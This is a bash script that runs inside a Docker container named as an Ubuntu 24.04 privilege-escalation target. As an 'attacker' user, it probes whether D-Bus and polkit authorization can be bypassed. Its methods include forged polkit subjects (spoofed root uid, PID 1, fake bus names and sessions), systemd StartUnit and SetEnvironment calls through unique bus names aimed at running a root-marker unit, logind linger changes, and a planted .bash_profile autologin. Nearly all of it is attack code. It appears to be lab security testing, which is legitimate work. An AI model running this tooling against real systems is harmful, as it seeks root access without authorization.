#!/usr/bin/env bash
set -euo pipefail

container="${1:-ubuntu24-server-lpe-target}"
repo_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
log_path="$repo_dir/logs/agent_dbus_subject_unique_probe.out"

mkdir -p "$repo_dir/logs"
tmp_log="$(mktemp "$repo_dir/logs/agent_dbus_subject_unique_probe.out.tmp.XXXXXX")"

docker exec -i "$container" bash -s >"$tmp_log" 2>&1 <<'TARGET'
set +e
export LC_ALL=C

WORK=/tmp/agent-dbus-subject-unique
MARKER=/root/agent_dbus_subject_unique_root
UNIT=/run/systemd/system/agent-dbus-subject-unique-marker.service
SELF=selfauth
TTYNUM=9
PROFILE=/home/selfauth/.bash_profile
PROFILE_BAK=$WORK/selfauth.bash_profile.bak
PROFILE_STATE=$WORK/selfauth.bash_profile.state

section() {
  printf '\n## %s\n' "$1"
}

run_attacker() {
  local label="$1"
  shift
  printf '\n### %s\n$ %s\n' "$label" "$*"
  timeout 8 runuser -u attacker -- "$@" 2>&1
  printf 'rc=%s\n' "$?"
}

cleanup_target() {
  set +e
  loginctl terminate-user "$SELF" >/dev/null 2>&1 || true
  systemctl start "getty@tty${TTYNUM}.service" >/dev/null 2>&1 || true
  pkill -f '^python3 /usr/lib/software-properties/software-properties-dbus' >/dev/null 2>&1 || true
  if [ -f "$PROFILE_STATE" ] && grep -qx existed "$PROFILE_STATE"; then
    cp -a "$PROFILE_BAK" "$PROFILE" 2>/dev/null || true
    chown "$SELF:$SELF" "$PROFILE" 2>/dev/null || true
  else
    rm -f "$PROFILE"
  fi
  rm -f "$UNIT"
  systemctl daemon-reload >/dev/null 2>&1 || true
  systemctl restart polkit.service >/dev/null 2>&1 || true
  rm -rf "$WORK"
  rm -f "$MARKER"
  systemctl reset-failed >/dev/null 2>&1 || true
}
trap cleanup_target EXIT

rm -rf "$WORK"
mkdir -m 1777 -p "$WORK"
rm -f "$MARKER"
pkill -f '^python3 /usr/lib/software-properties/software-properties-dbus' >/dev/null 2>&1 || true
systemctl restart polkit.service >/dev/null 2>&1 || true

if ! id "$SELF" >/dev/null 2>&1; then
  useradd -m -s /bin/bash "$SELF"
fi
echo "$SELF:$SELF" | chpasswd
usermod -G "$SELF" "$SELF"

if [ -e "$PROFILE" ]; then
  mkdir -p "$WORK"
  cp -a "$PROFILE" "$PROFILE_BAK"
  echo existed >"$PROFILE_STATE"
else
  echo absent >"$PROFILE_STATE"
fi

cat >"$UNIT" <<'UNITEOF'
[Unit]
Description=agent dbus unique-name marker

[Service]
Type=oneshot
ExecStart=/bin/sh -c 'id > /root/agent_dbus_subject_unique_root'
UNITEOF
systemctl daemon-reload >/dev/null 2>&1

section "target baseline"
{
  sed -n '1,8p' /etc/os-release
  uname -a
  systemctl is-system-running
  systemctl --failed --no-legend
  id attacker
  id "$SELF"
  passwd -S attacker
  passwd -S "$SELF"
  dpkg-query -W -f='${binary:Package}\t${Version}\t${db:Status-Abbrev}\n' \
    dbus dbus-daemon dbus-bin polkitd libpolkit-gobject-1-0 libpolkit-agent-1-0 \
    systemd packagekit udisks2 netplan.io software-properties-common bolt unattended-upgrades \
    2>&1 | sort
  busctl --system list --no-pager
} 2>&1

section "default policy snippets"
{
  grep -RHo '<allow send_destination="[^"]*"\|<deny send_destination="[^"]*"\|send_interface="[^"]*"\|send_member="[^"]*"' \
    /usr/share/dbus-1/system.d /etc/dbus-1/system.d 2>/dev/null | sort | uniq | sed -n '1,180p'
  python3 - <<'PY'
import glob
import xml.etree.ElementTree as ET
interesting = {
    "org.freedesktop.systemd1.manage-units",
    "org.freedesktop.systemd1.set-environment",
    "org.freedesktop.login1.set-self-linger",
    "org.freedesktop.login1.set-user-linger",
    "org.freedesktop.packagekit.system-sources-refresh",
    "org.freedesktop.packagekit.package-install",
    "org.freedesktop.udisks2.loop-setup",
    "com.ubuntu.softwareproperties.applychanges",
}
for path in sorted(glob.glob("/usr/share/polkit-1/actions/*.policy")):
    root = ET.parse(path).getroot()
    for action in root.findall("action"):
        aid = action.get("id")
        if aid not in interesting:
            continue
        vals = {}
        for key in ("allow_any", "allow_inactive", "allow_active"):
            node = action.find("defaults/" + key)
            vals[key] = (node.text or "").strip() if node is not None else ""
        print(f"{aid}\tany={vals['allow_any']}\tinactive={vals['allow_inactive']}\tactive={vals['allow_active']}\t{path}")
PY
} 2>&1

cat >"$WORK/polkit_subject_probe.py" <<'PY'
#!/usr/bin/python3
import os
import subprocess
import dbus

bus = dbus.SystemBus()
authority = bus.get_object("org.freedesktop.PolicyKit1", "/org/freedesktop/PolicyKit1/Authority")
iface = dbus.Interface(authority, "org.freedesktop.PolicyKit1.Authority")
dbus_iface = dbus.Interface(bus.get_object("org.freedesktop.DBus", "/org/freedesktop/DBus"), "org.freedesktop.DBus")

def start_time(pid):
    with open(f"/proc/{pid}/stat") as f:
        return int(f.read().split()[21])

def unix_process(pid, uid=None, start=None):
    attrs = {
        "pid": dbus.UInt32(int(pid)),
        "start-time": dbus.UInt64(start_time(int(pid)) if start is None else int(start)),
    }
    if uid is not None:
        attrs["uid"] = dbus.Int32(int(uid))
    return ("unix-process", attrs)

def system_bus_name(name):
    return ("system-bus-name", {"name": dbus.String(name)})

def unix_session(session_id):
    return ("unix-session", {"session-id": dbus.String(session_id)})

def printable_result(result):
    authorized, challenge, details = result
    return f"authorized={bool(authorized)} challenge={bool(challenge)} details={dict(details)}"

def check(label, subject, action, flags=0):
    try:
        result = iface.CheckAuthorization(subject, action, {}, dbus.UInt32(flags), f"agent-dbus-{os.getpid()}-{label}-{action}")
        print(f"CHECK {label} {action} flags={flags} -> {printable_result(result)}")
    except Exception as exc:
        print(f"CHECK {label} {action} flags={flags} ERR {type(exc).__name__}: {exc}")

def temp(label, subject):
    for method in ("EnumerateTemporaryAuthorizations", "RevokeTemporaryAuthorizations"):
        try:
            result = getattr(iface, method)(subject)
            print(f"TEMP {label} {method} -> {result}")
        except Exception as exc:
            print(f"TEMP {label} {method} ERR {type(exc).__name__}: {exc}")

def owner(name):
    try:
        return str(dbus_iface.GetNameOwner(name))
    except Exception as exc:
        return f"ERR:{exc}"

print(f"CALLER uid={os.getuid()} pid={os.getpid()} unique={bus.get_unique_name()} xdg_session={os.environ.get('XDG_SESSION_ID','')}")
for name in ("org.freedesktop.systemd1", "org.freedesktop.login1", "org.freedesktop.PolicyKit1", "org.freedesktop.PackageKit", "org.freedesktop.UDisks2", "io.netplan.Netplan", "com.ubuntu.SoftwareProperties"):
    print(f"OWNER {name} {owner(name)}")

own = unix_process(os.getpid(), os.getuid())
subjects = [
    ("own-unix-process", own),
    ("own-system-bus-name", system_bus_name(bus.get_unique_name())),
    ("own-pid-forged-root-uid", unix_process(os.getpid(), 0)),
    ("pid1-root-unix-process", unix_process(1, 0)),
    ("pid1-root-wrong-start", unix_process(1, 0, start=1)),
    ("systemd-unique-bus-name", system_bus_name(owner("org.freedesktop.systemd1"))),
    ("systemd-well-known-bus-name", system_bus_name("org.freedesktop.systemd1")),
    ("fake-unique-bus-name", system_bus_name(":1.999999")),
]

sid = os.environ.get("XDG_SESSION_ID")
if sid:
    subjects.append((f"actual-unix-session-{sid}", unix_session(sid)))
    subjects.append(("fake-unix-session-c999", unix_session("c999")))

actions = [
    "org.freedesktop.login1.set-self-linger",
    "org.freedesktop.systemd1.manage-units",
    "org.freedesktop.packagekit.system-sources-refresh",
    "org.freedesktop.packagekit.package-install",
]
for label, subject in subjects:
    for action in actions:
        check(label, subject, action, flags=0)

for label, subject in subjects:
    if label.startswith("own") or label.startswith("actual-unix-session") or label.startswith("pid1"):
        temp(label, subject)

try:
    print("TEMP revoke-by-id random ->", iface.RevokeTemporaryAuthorizationById("agent-dbus-not-real"))
except Exception as exc:
    print(f"TEMP revoke-by-id random ERR {type(exc).__name__}: {exc}")

print("PKCHECK no-session/current-process")
for action in actions:
    proc = subprocess.run(["pkcheck", "--action-id", action, "--process", str(os.getpid())], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, timeout=5)
    print(f"PKCHECK {action} rc={proc.returncode} out={proc.stdout.strip()!r}")
PY
chmod 0755 "$WORK/polkit_subject_probe.py"

section "polkit authority subject binding as uid1001"
runuser -u attacker -- timeout 20 "$WORK/polkit_subject_probe.py" 2>&1
echo "polkit_subject_probe_rc=$?"

section "unique-name method-call policy and polkit checks"
{
  systemd_unique="$(busctl --system list --no-pager --no-legend | awk '$1=="org.freedesktop.systemd1"{print $5; exit}')"
  login1_unique="$(busctl --system list --no-pager --no-legend | awk '$1=="org.freedesktop.login1"{print $5; exit}')"
  udisks_unique="$(busctl --system list --no-pager --no-legend | awk '$1=="org.freedesktop.UDisks2"{print $5; exit}')"
  netplan_unique="$(busctl --system list --no-pager --no-legend | awk '$1=="io.netplan.Netplan"{print $5; exit}')"
  unattended_unique="$(busctl --system list --no-pager --no-legend | awk '$3=="unattended-upgr"{print $1; exit}')"

  busctl --system call com.ubuntu.SoftwareProperties / com.ubuntu.SoftwareProperties Reload >/dev/null 2>&1 || true
  software_unique="$(busctl --system list --no-pager --no-legend | awk '$1=="com.ubuntu.SoftwareProperties"{print $5; exit}')"

  printf 'unique_names systemd=%s login1=%s udisks=%s netplan=%s software=%s unattended=%s\n' \
    "$systemd_unique" "$login1_unique" "$udisks_unique" "$netplan_unique" "$software_unique" "$unattended_unique"
  ls -l "$UNIT"

  run_attacker "systemd StartUnit marker through well-known" busctl --system call org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager StartUnit ss agent-dbus-subject-unique-marker.service replace
  run_attacker "systemd StartUnit marker through unique name" busctl --system call "$systemd_unique" /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager StartUnit ss agent-dbus-subject-unique-marker.service replace
  run_attacker "systemd SetEnvironment through unique name" busctl --system call "$systemd_unique" /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager SetEnvironment as 1 AGENT_DBUS_UNIQUE=1
  run_attacker "logind SetUserLinger root through unique name" busctl --system call "$login1_unique" /org/freedesktop/login1 org.freedesktop.login1.Manager SetUserLinger ubb 0 true false
  run_attacker "netplan Config through unique name" busctl --system call "$netplan_unique" /io/netplan/Netplan io.netplan.Netplan Config
  run_attacker "software-properties AddSourceFromLine through unique name" busctl --system call "$software_unique" / com.ubuntu.SoftwareProperties AddSourceFromLine s 'deb http://127.0.0.1/ubuntu noble main'
  run_attacker "udisks manager CanFormat through unique name" busctl --system call "$udisks_unique" /org/freedesktop/UDisks2/Manager org.freedesktop.UDisks2.Manager CanFormat s ext4

  if [ -n "$unattended_unique" ]; then
    run_attacker "unattended-upgrades unique tree" busctl --system tree "$unattended_unique"
    run_attacker "unattended-upgrades unique root introspect" busctl --system introspect "$unattended_unique" /
  else
    echo "unattended_unique=missing"
  fi

  echo "marker_after_unique_calls:"
  ls -l "$MARKER" 2>&1 || true
  [ -e "$MARKER" ] && cat "$MARKER" || true
} 2>&1

section "active selfauth subject binding"
{
  install -d -o "$SELF" -g "$SELF" /home/selfauth/agent-dbus-subject-unique
  cp "$WORK/polkit_subject_probe.py" /home/selfauth/agent-dbus-subject-unique/polkit_subject_probe.py
  chown "$SELF:$SELF" /home/selfauth/agent-dbus-subject-unique/polkit_subject_probe.py
  cat >/home/selfauth/agent-dbus-subject-unique/active.sh <<'SH'
#!/usr/bin/env bash
set +e
export LC_ALL=C
{
  echo "ACTIVE_IDENTITY"
  id
  tty
  echo "XDG_SESSION_ID=${XDG_SESSION_ID:-}"
  loginctl show-session "${XDG_SESSION_ID:-}" -p Id -p User -p Name -p State -p Active -p Remote -p Type -p TTY -p Seat 2>&1
  /home/selfauth/agent-dbus-subject-unique/polkit_subject_probe.py
} >/tmp/agent-dbus-subject-unique/active-selfauth.out 2>&1
SH
  chmod 0755 /home/selfauth/agent-dbus-subject-unique/active.sh
  chown "$SELF:$SELF" /home/selfauth/agent-dbus-subject-unique/active.sh
  cat >"$PROFILE" <<'SH'
/home/selfauth/agent-dbus-subject-unique/active.sh
exit
SH
  chown "$SELF:$SELF" "$PROFILE"
  if command -v openvt >/dev/null 2>&1 && [ -e "/dev/tty${TTYNUM}" ]; then
    timeout 90 openvt -c "$TTYNUM" -s -f -w -- /bin/login -f "$SELF" 2>&1
    echo "openvt_rc=$?"
  else
    echo "openvt or tty${TTYNUM} unavailable"
  fi
  echo "--- active selfauth output ---"
  sed -n '1,260p' "$WORK/active-selfauth.out" 2>&1 || true
} 2>&1

section "final root proof and health"
{
  ls -l "$MARKER" 2>&1 || true
  [ -e "$MARKER" ] && cat "$MARKER" || true
  systemctl --no-pager --full status polkit.service 2>&1 | sed -n '1,30p'
  journalctl -u polkit.service -n 45 --no-pager 2>&1 | sed -n '1,80p'
  systemctl is-system-running
  systemctl --failed --no-legend
} 2>&1
TARGET

mv "$tmp_log" "$log_path"
printf '%s\n' "$log_path"
